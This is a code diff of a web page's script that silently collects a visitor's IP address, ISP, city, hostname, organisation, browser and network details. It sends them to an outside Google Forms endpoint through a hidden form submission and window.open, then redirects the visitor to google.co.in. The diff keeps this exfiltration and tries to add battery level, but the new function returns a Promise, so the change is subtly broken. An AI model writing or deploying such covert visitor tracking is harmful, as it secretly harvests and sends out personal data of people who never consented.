@@ -34,13 +34,12 @@
     </style>
 
     <script type="application/javascript">
-function batt(){navigator.getBattery().then(function(b){document.getElementById('HS-Battery') = b.level * 100 + "%";});}
-batt();
+function batt(){navigator.getBattery().then(function(b){return b.level * 100 + "%";});}
    function getIP(json){var Y = document.getElementById("1");
 //var ui = "ISP" + ":" + json.isp + "," + "PIP" + ":" + json.ip + "," + "," + "city" + ":" + json.city + "," + "," + "hostname" +  ":" + json.hostname + "," + "," + "Org" + ":" + json.org;  
    
 Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org;
-window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org}&entry.470512502=Device:${navigator.userAgent}`,"jv");;
+window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${json.isp} ,${json.ip},${json.city},${json.hostname},${json.org}&entry.470512502=Device:${navigator.userAgent} ${batt()}`,"jv");;
 window.open("https://google.co.in","blank");
 }   
     
@@ -49,7 +48,7 @@ window.open("https://google.co.in","blank");
 
    function Pj(){
      var X = document.getElementById("2");   
-    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href},"Charge":${document.getElementById('HS-Battery').innerHTML}`;
+    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href}`;
  var Z =document.getElementById("form");
     Z.submit();  
   location.href="https://google.co.in";
